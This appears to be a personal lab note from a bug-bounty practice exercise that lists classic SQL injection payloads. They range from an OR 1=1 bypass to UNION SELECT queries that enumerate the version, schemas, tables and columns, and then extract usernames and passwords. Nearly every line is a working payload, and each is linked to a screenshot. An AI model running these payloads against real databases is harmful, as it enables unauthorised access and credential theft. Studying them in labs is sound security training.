### SQL Injection 0x01

## SQL Injection Payloads :

- **Classic SQLi Payloads :**
    
    - `jeremy' OR 1=1#`

    - `jeremy' union select null,null,null#`

    - **Once you have this :**
        
        - _You can use `union` to extract information from the DB_.
    
    1. **SQL version :**
        
        - `jeremy' union select null,null,version()#
        - ![[sql_injection_lab_.png]]

    2. **Get other table names :**
        
        - `jeremy' union select null,null,table_name from information_schema.tables#`
        - ![[sql injection lab 2.png]]
        
    3. **Get other column names :**
        
        - `jeremy' union select null,null,column_name from information_schema.columns#`
        - ![[sql injection lab 3.png]]

    4. **Get other schema names :**
        
        - `jeremy' union select null, null, schema_name from information_schema.schemata#` 
        - ![[sql injection lab 4.png]]

    5.  **Get current table name from the database :** 
        
        - `jeremy' union select null,null,database()#`
        - ![[sql injection lab 5.png]]
    
	6.  **Get all the tables from a particualar table :** 
	
        - `jeremy' union select null,null,table_name from information_schema.tables WHERE table_schema='bb-labs'#`
        - ![[sql injection lab 6.png]]

    7. **Get User password or in general if u want to get information from any tables :**
    
	    - `jeremy' union select null,null,username from injection0x01#`
	    - ![[sql injection lab 7.png]]
        - `jeremy' union select null,null,password from injection0x01#`
